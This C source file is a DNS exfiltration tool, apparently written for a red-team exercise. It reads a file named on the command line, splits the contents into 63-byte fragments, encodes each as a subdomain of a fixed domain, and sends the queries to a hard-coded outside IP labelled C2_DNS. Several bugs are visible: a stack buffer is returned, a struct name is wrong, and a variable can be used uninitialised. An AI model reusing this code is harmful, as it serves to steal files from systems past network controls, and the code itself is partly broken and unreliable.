/*
 *  File containing class and functions to handle a DNS Query
 *  @author Doshmajhan
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "query.h"

// Global variables
static const char DOMAIN[] = "doshmajhan.com";      // domain we're sending queries to
static const char WHITE_TEAM_DNS[] = "10.22.0.0";   // White team dns, change when we find out
//static const char C2_DNS[] = "10.22.16.16";           // my dns server
static const char C2_DNS[] = "54.204.129.96";

/* Function:    createQuery
 * ------------------------
 * Creates a query for the given info
 * 
 * domain: the domain to query
 *
 * returns: a construct query struct to be sent
 */
unsigned char * createQuery(char *domain){
    unsigned char buf[65536], *qname;
    struct DNS_HEADER *headers = NULL;
    struct DNS_QUESTION *question = NULL;
    //buf = malloc(65536);

    printf("Writing headers...\n");
    // Write out header in the packet
    headers = (struct DNS_HEADERS *)&buf;
    headers->id = 1337;
    headers->qr = 0;
    headers->opcode = 0;
    headers->aa = 0;
    headers->tc = 0;
    headers->rd = 1;
    headers->ra = 0;
    headers->z = 1;
    headers->rcode = 0;
    headers->qdcount = 1;
    headers->ancount = 0;
    headers->nscount = 0;
    headers->arcount = 0;
    printf("Headers wrote\n");

    printf("Writing qname...\n");
    // Write qname to header in the packet
    qname = (unsigned char *)&buf[sizeof(struct DNS_HEADER)];
    strncpy(qname, domain, strlen(domain));
    printf("Qname wrote\n");

    printf("Writing question\n");
    // Write question section
    question = (struct DNS_QUESTION *)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)];
    question->qtype = 1;
    question->qclass = 1;
    printf("Question wrote\n");
    return buf;
}


/* Function:    combineName
 * ------------------------
 * Combines the info to be sent with the defined domain
 * and converts it to DNS packet friendly domain
 *
 * Example: www.google.com becomes 3www6google3com
 *
 * info: the info being sent out
 * domain: the domain to send the info too
 *
 * returns: the newly combined domain
 */
char * combineName(char *info, const char *domain){
    char *new = malloc(256);
    char *temp = malloc(strlen(domain) + 1);
    char *tempToken;
    char *token;

    // Copy domain into temp variable to modify
    strncpy(temp, domain, strlen(domain));
    temp[strlen(domain)] = '\0';
    
    // Format our new domain
    sprintf(new, "%zu", strlen(info));
    strncat(new, info, strlen(info));
    
    // Split our domain
    token = strtok(temp, ".");
    while(token != NULL){
        tempToken = malloc(256);
        sprintf(tempToken, "%zu%s", strlen(token), token);
        strncat(new, tempToken, strlen(tempToken));
        token = strtok(NULL, ".");
    }
    return new;
}


/* Function:    sendPacket
 * -----------------------
 *  Sends our packet to the DNS Server
 *
 *  domain: the domain to be queried
 *  fqdnLen: the length of the fully qualified domain name being queried
 */
void sendPacket(char *domain, size_t fqdnLen){
    struct sockaddr_in dest;
    int sock;
    unsigned char buf[65536], *qname;
    struct DNS_HEADER *headers = NULL;
    struct DNS_QUESTION *question = NULL;
    //buf = malloc(65536);

    printf("Writing headers...\n");
    // Write out header in the packet
    headers = (struct DNS_HEADERS *)&buf;
    headers->id = 1337;
    headers->qr = 0;
    headers->opcode = 0;
    headers->aa = 0;
    headers->tc = 0;
    headers->rd = 1;
    headers->ra = 0;
    headers->z = 1;
    headers->rcode = 0;
    headers->qdcount = 1;
    headers->ancount = 0;
    headers->nscount = 0;
    headers->arcount = 0;
    printf("Headers wrote\n");

    printf("Writing qname...\n");
    // Write qname to header in the packet
    qname = (unsigned char *)&buf[sizeof(struct DNS_HEADER)];
    strncpy(qname, domain, strlen(domain));
    printf("Qname wrote\n");

    printf("Writing question\n");
    // Write question section
    question = (struct DNS_QUESTION *)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)];
    question->qtype = 1;
    question->qclass = 1;
    printf("Question wrote\n");
    
    printf("Making socket...\n");
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(C2_DNS);

    printf("Sending packet...\n");
    if(sendto(sock, (char *)buf, sizeof(struct DNS_HEADER) + (fqdnLen + 1) + 
                sizeof(struct DNS_QUESTION), 0, (struct sockaddr*)&dest, sizeof(dest)) < 0){

        fprintf(stderr, "Error sending packet\n");
    }
    printf("Done\n");
}


/* Function:    fragmentData
 * -------------------------
 * Fragments our data into an array of 63 byte or less chunks so
 * each index can be sent as a packet
 *
 * buffer: the buffer containing the data to send out
 * fragmentNum: the number of fragments we're going to need
 *
 * return: an array of strings to be sent out
 */
char ** fragmentData(char * buffer, int fragmentNum){
    char **fragmented;
    int begin, end;

    // Our beginning and ending indexs for string splicing
    begin = 0;
    end = strlen(buffer);

    // Allocate our fragment array
    fragmented = malloc(fragmentNum * sizeof(char*));

    // Create all of our fragments
    for(int i = 0; i < fragmentNum; i++){
        fragmented[i] = malloc(64 * sizeof(char));
        if((end - begin) < 63){
            strncpy(fragmented[i], buffer + begin, end - begin);
        }else {
            strncpy(fragmented[i], buffer + begin, 63);
        }
        fragmented[i][63] = '\0';
        begin += 63;
    }
    return fragmented;
}


/* Function:    readFile
 * ---------------------
 * Reads a file into a buffer
 * 
 * fp: the file pointer to read
 *
 * returns: a buffer with the contents of the file
 */
char * readFile( FILE *fp){
    char *buf;
    if(fseek(fp, 0L, SEEK_END) == 0){

        // get size of file
        long size = ftell(fp);
        if(size == -1){
            // error
        }

        // allocate buffer for size of data in file
        buf = malloc(sizeof(char) * (size + 1));
        
        // go back to start of file
        if(fseek(fp, 0L, SEEK_SET) != 0 ){
            // error
        }

        // read file into buffer
        size_t len = fread(buf, sizeof(char), size, fp);
        if( ferror(fp) != 0){
            fprintf(stderr, "Error reading from file\n");
        } 
        else {
            buf[len++] = '\0';  // null terminate data
       }
    }
    fclose(fp);
    return buf;
}


// Main function
int main(int argc, char *argv[]){
    char *buffer, *fqdn, **fragmented;
    unsigned char *query;
    int fragmentNum;
    // Check if file is present in command line args
    if(argc == 2){
        FILE *fp;
        fp = fopen(argv[1], "r");
        if(fp == NULL){
            // do something
        }
        buffer = readFile(fp);
    }

    // How many fragments were going to need 
    fragmentNum = (strlen(buffer) / 63) + 1;

    // Fragment our data into sendable chunks
    fragmented = fragmentData(buffer, fragmentNum);

    // Loop through and send each fragment out
    for(int i = 0; i < fragmentNum; i++){
        fqdn = combineName(fragmented[i], DOMAIN);
        printf("Fragment %d: %s\n", i, fqdn);
        sendPacket(fqdn, strlen(fqdn));
    }

    return EXIT_SUCCESS;
}
